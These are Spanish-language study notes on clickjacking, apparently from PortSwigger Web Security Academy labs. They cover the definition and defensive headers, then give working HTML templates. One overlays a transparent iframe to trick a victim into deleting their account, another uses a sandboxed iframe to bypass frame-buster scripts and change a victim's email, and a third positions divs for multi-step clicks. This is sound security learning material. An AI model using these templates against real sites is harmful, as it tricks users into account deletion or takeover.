
----------
# Definición

>**Clickjacking** (también conocido como **"secuestro de clics"**) es una técnica de ataque en la que un usuario es engañado para hacer clic en algo diferente de lo que cree. Esto se logra ocultando o disfrazando elementos de una página web, como botones o enlaces, detrás de otros contenidos visibles para el usuario.

## Ejemplo típico

Un atacante puede incrustar un botón de "Me gusta" de Facebook invisible detrás de un botón aparentemente inofensivo como "Ver video". Al hacer clic, el usuario sin saberlo realiza una acción en otra web (como dar "Me gusta" a una página, autorizar pagos, cambiar configuraciones, etc.).

## Objetivo

El objetivo del clickjacking es *manipular las acciones del usuario* para beneficio del atacante, que puede ser económico, de acceso o reputacional.

## Medidas de protección

- Uso del encabezado HTTP `X-Frame-Options` para evitar que una página se incruste en iframes.
    
- Encabezado `Content-Security-Policy: frame-ancestors`.
    
- Detectar y *bloquear contenido embebido* no autorizado mediante JavaScript.
    
- Diseñar *interfaces que alerten* al usuario sobre acciones sensibles.

---------
# Explotación

## Básica

1. Desde una página de atacante, se crea un `<iframe>` donde haya un *botón* que realice la acción que queremos forzar en el usuario.
2. Se edita el **estilo** del iframe para que sea prácticamente transparente con el atributo *opacity*.
3. Se añade un **elemento con texto** (que induzca a la víctima a clicar ahí) que se desplazará por medio del estilo hasta posicionarlo *encima del botón deseado*.

El resultado: la víctima clicará en el texto, pero en realidad estará clicando en el botón que está por detrás del texto, realizando la acción que queremos.

Ejemplo de plantilla donde se induce a eliminar la cuenta:
``` html
<style>
	iframe {
		width: 500px;
		height: 600px;
		opacity: 0.001;
	}

	div {
		position: absolute;
		top: 495px;
		left: 40px;
	}
</style>

<div>click</div>
<iframe src="https://0afe00a90463315e80ed179500a5005c.web-security-academy.net/my-account"></iframe>
```

## Acción con parámetros

- Si la acción que queremos hacer necesita parámetros, como cambiar el email que necesita un nuevo valor de correo, se puede tratar de settear el valor a través de **parámetros URL**.

-----------
# Frame Buster Script bypass

Un **frame buster script** es un código javascript que evalúa si se encuentra dentro de un iframe y bloquea o limita la interacción.

## Via iframe sandbox

- Se puede introducir un parámetro sandbox en la etiqueta `<iframe>` para reducir todos los *permisos* del iframe, entre los que se encuentra la ejecución de código javascript.
	``` html
	<iframe src="https://0a47003f04ffe5bd80fbf8590066000e.web-security-academy.net/my-account?email=hacked@hacked.com" sandbox="allow-forms"></iframe>
	```
	*\*Nota*: en el ejemplo se cambiaba el correo del usuario, por lo que era necesario habilitar los formularios en el sandbox.

-------------
# DOM-based XSS triggering

El *Clickjacking* se puede aprovechar para lanzar exploits DOM-based XSS que requieren interacción del usuario.

-----------
# Multi-Step Clickjacking

Si para realizar la acción es necesario múltiples clicks, se puede jugar con **identificadores** para declarar los `<div>` de modo que para cada identificador se le añade un estilo para posicionar a cada uno en el lugar correcto.
-*Declaración de divs*
``` html
<div id="first_click">Click me first</div>
<div id="second_click">Click me next</div>
```

-*Posicionamiento*
``` html
<style>
	#first_click {
		position: absolute;
		top: 495px;
		left: 40px;
	}

	#second_click {
		position:absolute;
		top: 295px;
		left: 200px;
	}
</style>
```